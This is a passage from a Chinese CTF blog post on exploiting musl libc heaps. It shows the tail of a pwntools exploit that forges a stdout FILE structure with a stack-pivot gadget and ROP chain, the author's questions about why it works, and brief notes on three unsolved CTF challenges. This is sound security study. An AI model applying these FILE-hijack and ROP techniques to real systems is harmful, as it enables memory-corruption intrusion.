class="number">0x15238</span></span><br><span class="line"><span class="comment"># 0x4bcf3: mov rsp, qword ptr [rdi + 0x30]; jmp qword ptr [rdi + 0x38]; </span></span><br><span class="line">stack_mig = libc.address + <span class="number">0x4bcf3</span></span><br><span class="line"></span><br><span class="line">stdout = flat(&#123;</span><br><span class="line">    <span class="number">0x20</span>: <span class="number">1</span>,         <span class="comment"># f-&gt;wpos</span></span><br><span class="line">    <span class="number">0x28</span>: <span class="number">1</span>,         <span class="comment"># f-&gt;wend</span></span><br><span class="line">    <span class="number">0x30</span>: rop_chain, </span><br><span class="line">    <span class="number">0x38</span>: ret, </span><br><span class="line">    <span class="number">0x48</span>: stack_mig  <span class="comment"># f-&gt;write</span></span><br><span class="line">&#125;,filler=<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> stdout</span><br><span class="line"><span class="comment">### Overwrite __stdout_FILE</span></span><br><span class="line">add(<span class="number">0x800</span>, stdout)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>

<h3 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a><strong>疑问</strong></h3><p>为什么add 0x800大小的chunk就可以直接申请到stdout_FILE，而不是从被释放的0x1000chunk开头开始（stdout_FILE - 0x940）?</p>
<p>为什么content_chunk5（0x1000）一开始要在0x238偏移后写入p32(5)，大概是绕过free时的检查？毕竟把它head头的offset从0x1550改成了1000</p>
<hr>
<h1 id="3题待复现"><a href="#3题待复现" class="headerlink" title="3题待复现"></a>3题待复现</h1><p>强网杯 2021 easyheap</p>
<p><a target="_blank" rel="noopener" href="https://cy2cs.top/2021/06/16/%E3%80%90ctf%E3%80%91%E5%BC%BA%E7%BD%91%E6%9D%AF-2021-easyheap/">https://cy2cs.top/2021/06/16/%E3%80%90ctf%E3%80%91%E5%BC%BA%E7%BD%91%E6%9D%AF-2021-easyheap/</a></p>
<p>DefCon_Quals_2021_mooosl</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241104#h2-0">https://www.anquanke.com/post/id/241104#h2-0</a></p>
<p>RCTF_2021_musl</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$./libc.so </span><br><span class="line">musl libc (x86_64)</span><br><span class="line">Version 1.2.2</span><br><span class="line">Dynamic Program Loader</span><br></pre></td></tr></table></figure>



<p>静态分析</p>
<p>禁用了execve</p>
<p>只能在add写chunk</p>
<p>idx&lt;=15</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">manage_chunk</span>&#123;</span> # <span class="number">0xc</span>(<span class="number">8</span>+<span class="number">4</span>)复用<span class="number">4</span>字节空间</span><br><span class="line">	<span class="keyword">void</span> *content_chunk_ptr; </span><br><span class="line">        <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">size_t</span> size - <span class="number">1</span>;	</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>free content_chunk</p>
<p>free manage_chunk</p>
<p>任意次数show</p>

      </div>
      <div class="post-copyright">
    <p class="copyright-item">
      <span>Author: </span>
      <a href="https://brooke-hub.github.io">WendyJellyBeans</a>
    </p>
    <p class="copyright-item">
      <span>Link: </span>
      <a href="https://brooke-hub.github.io/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/">https://brooke-hub.github.io/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/</a>
    </p>
    <p class="copyright-item">
      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
    </p>
  </div>
      <footer class="post-footer">
        <div class="post-tags">
            <a href="/tags/pwn/">pwn</a>
            </div>
        
        <nav class="post-nav"><a class="prev" href="/2021/09/09/RISC-V-pwn-%E5%88%9D%E6%8E%A2/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">RISC-V_pwn_初探</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    <a class="next" href="/2021/09/05/2021%E7%A5%A5%E4%BA%91%E6%9D%AFpwn-wp/">
        <span class="next-text nav-default">2021祥云杯pwn_wp</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    </nav></footer>
    </article></div><div class="comments" id="comments"></div></div>
      </main>

      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:your@email.com" class="iconfont icon-email" title="email"></a>
        <a target="_blank" rel="noopener" href="https://github.com/ahonn" class="iconfont icon-github" title="github"></a>
        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
    </div><div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>

  <span class="copyright-year">&copy;2015 - 2021<span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">WendyJellyBeans</span>
  </span>
</div>
</footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
</body>
</html>
